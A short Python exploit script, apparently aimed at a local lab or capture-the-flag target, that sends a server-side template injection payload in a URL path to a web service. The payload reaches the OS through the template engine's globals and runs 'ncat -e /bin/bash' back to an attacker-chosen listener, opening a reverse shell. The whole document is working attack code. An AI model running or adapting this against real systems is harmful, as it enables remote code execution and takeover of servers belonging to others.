import requests


def get_result(ip, port, payload):
    url = f"http://{ip}:{port}/FOO/{payload}"
    response = requests.get(url)
    result = response.text.split("/FOO/")[-1]
    return result


def main(rhost, rport, lhost, lport):
    payload = "{{request.application.__globals__.__builtins__.__import__('os').popen('ncat -e /bin/bash " + lhost + " " + str(lport) + "').read()}}"
    result = get_result(rhost, rport, payload)
    print(result)
    return result


if __name__ == "__main__":
    main("127.0.0.1", 9004, "host.docker.internal", 4444)
